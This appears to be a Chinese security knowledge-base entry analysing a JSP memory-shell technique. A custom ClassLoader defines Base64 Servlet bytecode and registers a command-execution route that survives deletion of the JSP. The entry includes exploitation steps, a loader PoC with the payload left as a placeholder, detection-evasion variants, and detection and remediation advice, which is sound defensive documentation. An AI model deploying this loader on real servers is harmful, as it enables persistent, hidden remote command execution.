---
id: web-java-classloader-jsp-memory-servlet-webshell
title: JSP 自定义 ClassLoader 注册内存 Servlet WebShell
type: scenario
domain: web
path: web/java/classloader
technique: jsp-classloader-memory-servlet
tags:
- java
- jsp
- classloader
- webshell
- memory-servlet
- tomcat
- servlet3
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-D
  verified_at: '2026-11-04T19:20:41+08:00'
  notes: 已对照原文与图片核对：ncsync.jsp 的 class Ld/defineClass/req(application,name,path)/REG:OK、gzms.jsp 的 AES_BASE64 与 /gzsync 均与样本一致；内存马需重启清除的结论合理；PoC 为结构示意，未实际执行。
url: /docs/web/java/classloader/web-java-classloader-jsp-memory-servlet-webshell/
draft: false
kb_aliases:
- JSP 内存马
- 内存 Servlet
- ClassLoader 马
- ncsync.jsp
---

## 一句话结论

攻击者只需能写入一个 JSP，就能让 JSP 通过自定义 `ClassLoader` 在内存中加载 Base64 字节码，再反射调用其注册方法把动态 Servlet 挂到容器路由上；删除 JSP 文件后该 Servlet 仍存活，直到应用重启。

## 原理

- JSP 由容器编译执行，天然持有隐式对象 `application`（`ServletContext`），具备调用 `addServlet`/`addMapping` 的能力。
- JSP 中的自定义 `ClassLoader` 调用 `defineClass` 直接从未落盘的字节数组定义类，避免把 `.class` 写入磁盘，减少文件痕迹。
- 加载出的类暴露一个静态注册方法（现场样本为 `req`，三个参数：`ServletContext`、Servlet 名、映射路径），内部调用容器的动态 Servlet 注册 API，把命令执行逻辑注册成新路由。
- JSP 本身只负责“加载 + 注册 + 回显 REG:OK”，注册完成后请求新路由即可执行命令；由于 Servlet 已注册进容器内存，删除 JSP 不会注销它。
- 该手法依赖 Servlet 3.0+ 的动态注册能力，Tomcat 7 及以上等主流容器均支持。

## 触发条件

- 攻击者已有任意 JSP 文件写入能力（上传、反序列化落地、后台功能、路径穿越等）。
- 目标为 Servlet 3.0+ 容器，JSP 可正常解析执行。
- 应用目录可写，且写入的 JSP 能被 Web 访问。
- 内存马注册后无需再写文件，因此对“只删文件”的应急方式有较强对抗性。

## 利用步骤

1. 准备命令执行型 Servlet 字节码，Base64 编码后内嵌进 JSP。
2. 将 JSP 写入可访问的 Web 目录（如 `webapps/nc_web/`）。
3. 请求该 JSP，触发 `defineClass` 与 `req(...)`，页面回显 `REG:OK` 表示注册成功。
4. 访问注册出的路由（如 `/ncsync`），携带连接密码执行命令。
5. 删除 JSP 文件后再次访问路由，确认 Servlet 仍在内存中；清理需重启应用或卸载对应 Context。

## PoC

```jsp
<%
class Ld extends ClassLoader {
    Ld(ClassLoader p) { super(p); }
    Class q(byte[] b) { return defineClass(b, 0, b.length); }
}
byte[] b = java.util.Base64.getDecoder().decode("BASE64_BYTECODE");
Class c = new Ld(Thread.currentThread().getContextClassLoader()).q(b);
java.lang.reflect.Method m = null;
for (java.lang.reflect.Method x : c.getMethods()) {
    if (x.getName().equals("req") && x.getParameterCount() == 3) { m = x; break; }
}
m.invoke(null, application, "ncsync", "/ncsync");
out.print("REG:OK");
%>
```

说明：现场样本使用 `defineClass(b,0,b.length)` 的封装方法加载内嵌类，并在异常时回显 `REG:ERR`；上面的字节码占位符需替换为实际的 Servlet 类。样本还包含密码校验以及 Windows/Linux 两套命令执行分支。

## 变体与关联

- 变体：通信层用 AES 加密后再 Base64（现场第二枚样本注册 `/gzsync`，类名 `AES_BASE64`），流量特征更弱。
- 变体：把注册方法名、参数顺序、路由名改掉，绕过基于固定字符串的检测；JSP 通过遍历方法名和参数个数适配不同实现。
- 关联：[[web-java-classloader]] 层的类加载与内存马机制；与反序列化入口组合时，常由 RCE 落 JSP 或直接注入内存马。
- 关联：同一攻击者复用连接密码可辅助关联多枚样本与同源基础设施。

## 检测与防御

- 检测：JSP 中出现超长 Base64 字符串、`defineClass`、`getContextClassLoader`、`getMethods`、`addServlet`/`addMapping` 等组合特征。
- 检测：Web 目录新增小体积 JSP（现场样本 7 KB、22 KB），修改时间与异常请求时间对齐。
- 检测：删除可疑 JSP 后路由仍可访问，说明存在内存 Servlet；用容器管理接口或内存分析枚举动态注册的 Servlet 与 Filter。
- 修复：封堵 JSP 写入入口，修补反序列化/上传漏洞；不需要 JSP 的业务关闭 JSP 解析。
- 处置：删除 JSP 后必须重启应用或卸载 Context，并复查内存 Servlet、Filter、Listener 与计划任务等其他持久化项。
- 加固：Web 目录最小写权限、RASP/EDR 监控 `defineClass` 与动态注册、集中留存访问日志以便还原注册请求。
